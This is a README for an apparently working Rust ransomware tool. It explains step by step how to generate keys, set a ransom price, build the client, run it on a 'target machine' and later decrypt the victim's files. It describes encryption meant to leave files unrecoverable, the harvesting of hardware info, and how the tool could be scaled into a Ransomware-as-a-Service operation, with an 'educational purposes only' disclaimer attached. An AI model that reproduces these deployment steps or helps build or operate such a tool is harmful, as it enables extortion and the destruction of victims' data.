# THIS IS FOR EDUCATIONAL PURPOSES ONLY!

## Simple Setup Steps

1. Using `cargo run --release --bin generator` generate the public and private keys
2. Copy the public key in the client folder
3. Set the price and uuid variables.
4. Build the client using `cargo build --release --bin client`
5. Run client on target machine
6. Having the private key, and both files generated on the target machine in the projects' root folder, use `cargo run --release --bin decrypt` to print the target's info and generate the decryption key
7. Copy decryption key on target machine, use `client decrypt` where "client" is the executable filename, to decrypt the files on the target machine

## Features
 - Keys are generated offline and use a combination of symmetric and asymmetric keys to make the files unrecoverable without the private key, even if the target's network is monitored.
 - Should be cross platform
 - Multi threaded
 - "Steals" hardware info

 ## About
 This is the most secure ransomware I can think of, it has a key generator binary, a client and a "decrypter" that lets the attacker decrypt the target's files.
 This can be codded with a backend to automate an entire RaaS (Ransomware as a Service) operation.
 However I didn't code a backend so "script kiddies" can't just host this and extract money from innocent people.

 If you didn't read the first "part", this is for EDUCATIONAL PURPOSES ONLY, please do NOT use this for any illegal purpose.